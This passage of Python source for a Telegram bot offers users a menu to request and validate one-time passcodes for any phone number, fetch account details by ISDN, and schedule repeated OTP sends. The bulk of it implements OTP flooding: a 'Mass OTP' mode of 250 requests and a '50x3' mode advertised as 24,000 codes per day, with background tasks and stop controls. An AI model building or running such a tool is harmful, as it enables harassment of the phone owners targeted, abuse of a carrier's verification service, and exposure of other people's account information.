    await update.message.reply_text(
        "📞 Send the phone number for mass OTP (250 requests).\n"
        "Each request will be sent with a 2-second delay.\n"
        "Use Stop Task button or /stop_task to cancel.\nType /cancel to abort."
    )
    return WAITING_MASS_PHONE

async def receive_mass_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    context.user_data["mass_phone"] = phone
    await update.message.reply_text(
        f"🚀 Starting mass OTP for {phone} (250 times, 2s delay).\n"
        "You will receive a report after each request.\n"
        "Use Stop Task button or /stop_task to stop."
    )
    task = asyncio.create_task(run_mass_otp(update.effective_user.id, phone, context))
    context.user_data["mass_task"] = task
    context.user_data["stop_task_flag"] = False
    return ConversationHandler.END

async def run_mass_otp(user_id: int, phone: str, context: ContextTypes.DEFAULT_TYPE):
    total = 250
    delay = 2
    for i in range(1, total + 1):
        if context.user_data.get("stop_task_flag"):
            await context.bot.send_message(
                chat_id=user_id,
                text=f"🛑 Mass OTP stopped after {i-1} requests."
            )
            return
        success, msg = await request_otp(phone)
        status = "✅" if success else "❌"
        await context.bot.send_message(
            chat_id=user_id,
            text=f"{status} OTP #{i}/{total} for {phone}:\n{msg}"
        )
        await asyncio.sleep(delay)
    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ Mass OTP completed: {total} requests sent for {phone}."
    )

async def stop_task(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop any running background task."""
    if context.user_data.get("stop_task_flag"):
        await update.message.reply_text("Already stopping...", reply_markup=simple_keyboard())
        return
    if (context.user_data.get("scheduled_task") or
        context.user_data.get("mass_task") or
        context.user_data.get("fifty_x_three_task")):
        context.user_data["stop_task_flag"] = True
        await update.message.reply_text("⏹️ Stopping task... Please wait.", reply_markup=simple_keyboard())
    else:
        await update.message.reply_text("No active task running.", reply_markup=simple_keyboard())

# ---------- Shared Handlers ----------
async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    context.user_data["phone"] = phone
    await update.message.reply_text(f"Requesting OTP for {phone}...")
    success, msg = await request_otp(phone)
    await update.message.reply_text(msg, reply_markup=simple_keyboard())
    return ConversationHandler.END

async def validate_phone_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    context.user_data["validate_phone"] = phone
    await update.message.reply_text("🔢 Now send the OTP code (digits only).")
    return WAITING_OTP

async def receive_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp = update.message.text.strip()
    phone = context.user_data.get("validate_phone")
    if not phone:
        await update.message.reply_text("Session expired. Please start over.", reply_markup=simple_keyboard())
        return ConversationHandler.END
    await update.message.reply_text(f"Validating OTP for {phone}...")
    success, result = await validate_otp(phone, otp)
    if success:
        formatted = json.dumps(result, indent=2, ensure_ascii=False)[:4000]
        await update.message.reply_text(
            f"✅ OTP validated successfully!\nResponse:\n<pre>{formatted}</pre>",
            parse_mode="HTML",
            reply_markup=simple_keyboard()
        )
    else:
        await update.message.reply_text(f"❌ {result}", reply_markup=simple_keyboard())
    return ConversationHandler.END

async def receive_isdn(update: Update, context: ContextTypes.DEFAULT_TYPE):
    isdn = update.message.text.strip()
    await update.message.reply_text(f"Fetching account details for {isdn}...")
    success, result = await get_account_details(isdn)
    if success:
        formatted = json.dumps(result, indent=2, ensure_ascii=False)[:4000]
        await update.message.reply_text(
            f"✅ Account details:\n<pre>{formatted}</pre>",
            parse_mode="HTML",
            reply_markup=simple_keyboard()
        )
    else:
        await update.message.reply_text(f"❌ {result}", reply_markup=simple_keyboard())
    return ConversationHandler.END

# ---------- Cancel Conversation ----------
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if (context.user_data.get("scheduled_task") or
        context.user_data.get("mass_task") or
        context.user_data.get("fifty_x_three_task")):
        context.user_data["stop_task_flag"] = True
    await update.message.reply_text("Operation cancelled.", reply_markup=simple_keyboard())
    return ConversationHandler.END

# ---------- Inline Callback Handlers ----------
async def inline_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "single_otp":
        await query.edit_message_text(
            "📞 Please send the phone number (example: 95912345678).\nType /cancel to abort."
        )
        return WAITING_PHONE
    elif data == "validate_otp":
        await query.edit_message_text(
            "📞 Send the phone number first (example: 95912345678).\nType /cancel to abort."
        )
        return WAITING_PHONE
    elif data == "account_details":
        await query.edit_message_text(
            "📄 Send the ISDN (example: +95912345678 or 95912345678).\nType /cancel to abort."
        )
        return WAITING_ISDN
    elif data == "schedule_otp":
        await query.edit_message_text(
            "Select schedule type:",
            reply_markup=schedule_type_keyboard()
        )
        return WAITING_SCHEDULE_TYPE
    elif data == "advanced_schedule":
        await query.edit_message_text(
            "📅 Advanced Schedule (Days of Week)\n\n"
            "Send the phone number (example: 95912345678).\n"
            "Type /cancel to abort."
        )
        context.user_data["schedule_mode"] = "advanced"
        return WAITING_SCHEDULE_PHONE
    elif data == "mass_otp":
        await query.edit_message_text(
            "📞 Send the phone number for mass OTP (250 requests).\n"
            "Use Stop Task button or /stop_task to cancel."
        )
        return WAITING_MASS_PHONE
    elif data == "fifty_x_three":
        await query.edit_message_text(
            "⚡ 50x3 Feature\n\n"
            "Send 50 OTP codes every 3 minutes!\n"
            "• Automatically resets at midnight\n"
            "• Runs continuously every day\n\n"
            "Send the phone number (example: 95912345678)."
        )
        return WAITING_50X3_PHONE
    elif data == "stop_task":
        await stop_task(update, context)
        await query.edit_message_text("Task stop initiated.", reply_markup=inline_menu_keyboard())
        return ConversationHandler.END
    elif data == "help":
        await query.edit_message_text(
            "📖 Help Menu\n\n"
            "• Single OTP – Request one OTP.\n"
            "• Validate OTP – Verify OTP code.\n"
            "• Account Details – Fetch account info.\n"
            "• Schedule OTP – Auto OTP at intervals.\n"
            "• Advanced Schedule – Schedule on specific days/times.\n"
            "• Mass OTP – 250 OTP requests in a row.\n"
            "• 50x3 – 50 OTP codes every 3 minutes, daily reset!\n"
            "• Stop Task – Stop any running task.\n\n"
            "50x3 Details:\n"
            "- 50 codes every 3 minutes (180 seconds)\n"
            "- Daily reset at midnight\n"
            "- 24,000 OTP codes per day maximum\n\n"
            "Schedule Examples:\n"
            "- '30' (30 seconds)\n"
            "- '2w 3d 4h 30m' (complex interval)\n"
            "- 'daily at 14:30' (daily at 2:30 PM)",
            reply_markup=inline_menu_keyboard()
        )
        return ConversationHandler.END
    elif data == "back_to_menu":
        await query.edit_message_text(
            "Main menu:",
            reply_markup=inline_menu_keyboard()
        )
        return ConversationHandler.END
    else:
        await query.edit_message_text("Unknown option.")
        return ConversationHandler.END

# ------------------ Main ------------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # Conversation for Single OTP
    single_conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex(r"^📱 Request OTP$"), single_otp_start_simple),
            CallbackQueryHandler(inline_menu_callback, pattern="^single_otp$")
        ],
        states={WAITING_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)]},
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    # Conversation for Validate OTP
    validate_conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex(r"^✅ Validate OTP$"), validate_otp_start_simple),
            CallbackQueryHandler(inline_menu_callback, pattern="^validate_otp$")
        ],
        states={
            WAITING_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, validate_phone_received)],
            WAITING_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_otp)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    # Conversation for Account Details
    account_conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex(r"^📄 Account Details$"), account_details_start_simple),
            CallbackQueryHandler(inline_menu_callback, pattern="^account_details$")
        ],
        states={WAITING_ISDN: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_isdn)]},
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    # Conversation for Schedule Type
    schedule_type_conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex(r"^⏰ Schedule OTP$"), schedule_type_selection),
            CallbackQueryHandler(inline_menu_callback, pattern="^schedule_otp$")
        ],
        states={
            WAITING_SCHEDULE_TYPE: [CallbackQueryHandler(handle_schedule_type, pattern="^(simple_schedule|advanced_schedule|custom_schedule|back_to_menu)$")],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    # Conversation for Simple Schedule
    simple_schedule_conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(handle_schedule_type, pattern="^simple_schedule$")
        ],
        states={
            WAITING_SCHEDULE_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, schedule_phone_received)],
            WAITING_SCHEDULE_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, schedule_count_received)],
            WAITING_SCHEDULE_INTERVAL: [MessageHandler(filters.TEXT & ~filters.COMMAND, schedule_interval_received)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    # Conversation for Advanced Schedule (Days of Week)
    advanced_schedule_conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex(r"^📅 Advanced Schedule$"), advanced_schedule_start),
            CallbackQueryHandler(inline_menu_callback, pattern="^advanced_schedule$")
        ],
        states={
            WAITING_SCHEDULE_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, schedule_phone_received)],
            WAITING_SCHEDULE_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, schedule_count_received)],
            WAITING_SCHEDULE_DAYS: [CallbackQueryHandler(handle_days_selection, pattern="^(day_mon|day_tue|day_wed|day_thu|day_fri|day_sat|day_sun|days_done|back_to_schedule_type)$")],
            WAITING_SCHEDULE_WEEK_INTERVAL: [MessageHandler(filters.TEXT & ~filters.COMMAND, advanced_schedule_week_received)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    # Conversation for Custom Schedule
    custom_schedule_conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(handle_schedule_type, pattern="^custom_schedule$")
        ],
        states={
            WAITING_SCHEDULE_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, schedule_phone_received)],
            WAITING_SCHEDULE_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, schedule_count_received)],
            WAITING_SCHEDULE_CUSTOM: [MessageHandler(filters.TEXT & ~filters.COMMAND, custom_schedule_interval_received)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    # Conversation for Mass OTP
    mass_conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex(r"^🔄 Mass OTP \(250x\)$"), mass_otp_start),
            CallbackQueryHandler(inline_menu_callback, pattern="^mass_otp$")
        ],
        states={WAITING_MASS_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_mass_phone)]},
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    # Conversation for 50x3 Feature
    fifty_x_three_conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex(r"^⚡ 50x3 \(50 codes/3min\)$"), fifty_x_three_start),
            CallbackQueryHandler(inline_menu_callback, pattern="^fifty_x_three$")
        ],
        states={WAITING_50X3_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_fifty_x_three_phone)]},
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop_task", stop_task))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(MessageHandler(filters.Regex(r"^(📱 Request OTP|✅ Validate OTP|📄 Account Details|⏰ Schedule OTP|📅 Advanced Schedule|🔄 Mass OTP \(250x\)|⚡ 50x3 \(50 codes/3min\)|🛑 Stop Task|❓ Help|🔘 Inline Menu)$"), handle_simple_buttons))
    app.add_handler(single_conv)
    app.add_handler(validate_conv)
    app.add_handler(account_conv)
    app.add_handler(schedule_type_conv)
    app.add_handler(simple_schedule_conv)
    app.add_handler(advanced_schedule_conv)
    app.add_handler(custom_schedule_conv)
    app.add_handler(mass_conv)
    app.add_handler(fifty_x_three_conv)
    app.add_handler(CallbackQueryHandler(inline_menu_callback, pattern="^(single_otp|validate_otp|account_details|schedule_otp|advanced_schedule|mass_otp|fifty_x_three|stop_task|help|back_to_menu)$"))

    logger.info("Bot started with 50x3 feature (50 codes every 3 minutes, daily reset).")
    app.run_polling()

if __name__ == "__main__":
    main()